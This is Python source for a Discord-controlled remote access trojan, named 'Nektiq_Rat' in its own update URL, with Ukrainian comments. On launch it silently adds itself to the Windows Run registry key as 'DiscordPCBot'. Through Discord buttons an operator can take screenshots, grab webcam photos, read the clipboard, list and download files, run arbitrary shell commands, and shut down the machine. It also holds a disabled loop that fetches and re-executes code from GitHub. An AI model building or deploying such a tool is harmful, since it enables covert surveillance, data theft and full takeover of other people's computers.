# bot_discord.py

import os
import sys
import subprocess
import tempfile
import time
import shutil
import ctypes
import threading
import requests
import winreg
import webbrowser

from threading import Thread
from pathlib import Path

import discord
from discord import File, ButtonStyle, Interaction
from discord.ext import commands
from discord.ui import View, Button, Modal, TextInput

import psutil
import cv2
import pyautogui

# ========== НАЛАШТУВАННЯ ==========

# Вбудований токен (встав сюди свій)
TOKEN = ""

# GitHub raw URL для автооновлення
GITHUB_RAW_URL = "https://raw.githubusercontent.com/myst1112/Discord_nektiqRat/main/Nektiq_Rat.py"
UPDATE_INTERVAL = 3600  # перевіряти раз на годину

PREFIX = "!"
INTENTS = discord.Intents.default()
INTENTS.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=INTENTS)
TMP = tempfile.gettempdir()
SCRIPT_PATH = os.path.abspath(__file__)
CLIENT_ID = f"{discord.__name__}_{os.getpid()}"

# —————————————— 1. АВТОЗАПУСК ——————————————

def ensure_autorun():
    """Записує себе в автозапуск Windows через реєстр."""
    exe_path = sys.executable
    cmd = f'"{exe_path}" "{SCRIPT_PATH}"'
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0, winreg.KEY_ALL_ACCESS
    )
    try:
        existing, _ = winreg.QueryValueEx(key, "DiscordPCBot")
    except FileNotFoundError:
        existing = None

    if existing != cmd:
        winreg.SetValueEx(key, "DiscordPCBot", 0, winreg.REG_SZ, cmd)
    winreg.CloseKey(key)

# Якщо запущено як зібраний .exe або звичайний .py — забезпечимо автозапуск
ensure_autorun()

# —————————————— 2. АВТООНОВЛЕННЯ ——————————————

def auto_update_loop():
    """Періодично підтягує оновлення з GitHub і перезапускає бот, якщо код змінився."""
    while True:
        try:
            resp = requests.get(GITHUB_RAW_URL, timeout=10)
            if resp.status_code == 200:
                new_code = resp.text
                with open(SCRIPT_PATH, "r", encoding="utf-8") as f:
                    old_code = f.read()
                if new_code != old_code:
                    with open(SCRIPT_PATH, "w", encoding="utf-8") as f:
                        f.write(new_code)
                    os.execv(sys.executable, [sys.executable, SCRIPT_PATH])
                    return
        except Exception:
            pass
        time.sleep(UPDATE_INTERVAL)

#threading.Thread(target=auto_update_loop, daemon=True).start()

# —————————————— УТИЛІТИ ——————————————

def take_screenshot() -> str:
    path = os.path.join(TMP, f"ss_{int(time.time())}.png")
    pyautogui.screenshot(path)
    return path

def photo_camera() -> str:
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read(); cam.release()
    if not ret: return None
    path = os.path.join(TMP, f"ph_{int(time.time())}.jpg")
    cv2.imwrite(path, frame)
    return path

def list_files() -> str:
    return "\n".join(os.listdir(os.getcwd())) or "(папка порожня)"

def save_attachment(attachment: discord.Attachment) -> str:
    path = os.path.join(os.getcwd(), attachment.filename)
    attachment.save(path)
    return path

def shutdown_pc():
    subprocess.call("shutdown /s /t 0", shell=True)

def reboot_pc():
    subprocess.call("shutdown /r /t 0", shell=True)

def sleep_pc():
    subprocess.call("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)

def turn_off_monitor():
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)

def change_volume(amount: int):
    # потребує nircmd у PATH
    cmd = f'nircmd changesysvolume {int(655.35*amount)}'
    subprocess.call(cmd, shell=True)

def execute_shell(cmd: str) -> str:
    return subprocess.getoutput(cmd)

def get_clipboard() -> str:
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except:
        return "(буфер порожній)"

def set_wallpaper(path: str):
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)

# —————————————— ІНТЕРАКТИВНЕ МЕНЮ ——————————————

class MainMenu(View):
    def __init__(self):
        super().__init__(timeout=None)
        specs = [
            ("Скріншот",     "screenshot",  ButtonStyle.primary),
            ("Фото з камери","photo",       ButtonStyle.primary),
            ("Список файлів","list",        ButtonStyle.secondary),
            ("Завантажити файл","upload",   ButtonStyle.secondary),
            ("Вимкнути ПК",  "shutdown",    ButtonStyle.danger),
            ("Перезавантажити","reboot",    ButtonStyle.danger),
            ("Сплячий режим","sleep",       ButtonStyle.secondary),
            ("Вимкнути монітор","monitor",  ButtonStyle.secondary),
            ("Гучність +",   "vol_up",      ButtonStyle.secondary),
            ("Гучність -",   "vol_down",    ButtonStyle.secondary),
            ("Відкрити Google","open",      ButtonStyle.link, "https://google.com"),
            ("Командний рядок","shell",     ButtonStyle.primary),
            ("Буфер обміну",  "clipboard",   ButtonStyle.primary),
            ("Змінити обої",  "wallpaper",   ButtonStyle.primary),
        ]
        for label, cid, style, *url in specs:
            self.add_item(Button(
                label=label, custom_id=cid,
                style=style, url=(url[0] if url else None)
            ))

    @discord.ui.button(custom_id="screenshot")
    async def screenshot(self, btn: Button, inter: Interaction):
        path = take_screenshot()
        await inter.response.send_message(file=File(path))
        os.remove(path)

    @discord.ui.button(custom_id="photo")
    async def photo(self, btn: Button, inter: Interaction):
        path = photo_camera()
        if not path:
            return await inter.response.send_message("Помилка камери")
        await inter.response.send_message(file=File(path))
        os.remove(path)

    @discord.ui.button(custom_id="list")
    async def lst(self, btn: Button, inter: Interaction):
        await inter.response.send_message(f"```\n{list_files()}\n```")

    @discord.ui.button(custom_id="upload")
    async def upload(self, btn: Button, inter: Interaction):
        await inter.response.send_modal(UploadModal())

    @discord.ui.button(custom_id="shutdown")
    async def shutdown_btn(self, btn: Button, inter: Interaction):
        Thread(target=shutdown_pc, daemon=True).start()
        await inter.response.send_message("Вимикаю ПК…")

    @discord.ui.button(custom_id="reboot")
    async def reboot_btn(self, btn: Button, inter: Interaction):
        Thread(target=reboot_pc, daemon=True).start()
        await inter.response.send_message("Перезавантаження…")

    @discord.ui.button(custom_id="sleep")
    async def sleep_btn(self, btn: Button, inter: Interaction):
        Thread(target=sleep_pc, daemon=True).start()
        await inter.response.send_message("Сплячий режим…")

    @discord.ui.button(custom_id="monitor")
    async def monitor_btn(self, btn: Button, inter: Interaction):
        turn_off_monitor()
        await inter.response.send_message("Монітор вимкнено")

    @discord.ui.button(custom_id="vol_up")
    async def vol_up(self, btn: Button, inter: Interaction):
        change_volume(10); await inter.response.send_message("Гучність +10%")

    @discord.ui.button(custom_id="vol_down")
    async def vol_down(self, btn: Button, inter: Interaction):
        change_volume(-10); await inter.response.send_message("Гучність -10%")

    @discord.ui.button(custom_id="shell")
    async def shell_btn(self, btn: Button, inter: Interaction):
        await inter.response.send_modal(ShellModal())

    @discord.ui.button(custom_id="clipboard")
    async def clip_btn(self, btn: Button, inter: Interaction):
        data = get_clipboard(); await inter.response.send_message(f"```\n{data}\n```")

    @discord.ui.button(custom_id="wallpaper")
    async def wall_btn(self, btn: Button, inter: Interaction):
        await inter.response.send_modal(WallpaperModal())

# —————————————— МОДАЛЬНІ ВІКНА ——————————————

class UploadModal(Modal):
    def __init__(self):
        super().__init__(title="Завантажити файл")
        self.file_url = TextInput(label="URL або шлях")
        self.add_item(self.file_url)

    async def on_submit(self, inter: Interaction):
        url = self.file_url.value
        try:
            if url.startswith("http"):
                r = requests.get(url, timeout=10)
                path = os.path.join(os.getcwd(), os.path.basename(url))
                open(path,"wb").write(r.content)
            else:
                shutil.copy(url, os.getcwd())
            await inter.response.send_message(f"Збережено в {os.getcwd()}")
        except Exception as e:
            await inter.response.send_message(f"Помилка: {e}")

class ShellModal(Modal):
    def __init__(self):
        super().__init__(title="Виконати команду")
        self.cmd = TextInput(label="Команда")
        self.add_item(self.cmd)

    async def on_submit(self, inter: Interaction):
        out = execute_shell(self.cmd.value)
        await inter.response.send_message(f"```\n{out}\n```")

class WallpaperModal(Modal):
    def __init__(self):
        super().__init__(title="Змінити обої")
        self.file_url = TextInput(label="URL або шлях")
        self.add_item(self.file_url)

    async def on_submit(self, inter: Interaction):
        url = self.file_url.value
        try:
            if url.startswith("http"):
                r = requests.get(url, timeout=10)
                path = os.path.join(TMP, f"wall_{int(time.time())}.jpg")
                open(path,"wb").write(r.content)
            else:
                path = url
            set_wallpaper(path)
            await inter.response.send_message("Обои змінено")
        except Exception as e:
            await inter.response.send_message(f"Помилка: {e}")

# —————————————— КОМАНДА СТАРТ ——————————————

@bot.command(name="menu")
async def menu(ctx):
    await ctx.reply("🔧 Головне меню управління ПК:", view=MainMenu())

# —————————————— ПОДІЯ on_ready ——————————————

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user} (ID {bot.user.id})")

# —————————————— СТАРТ БОТА ——————————————

bot.run(TOKEN)
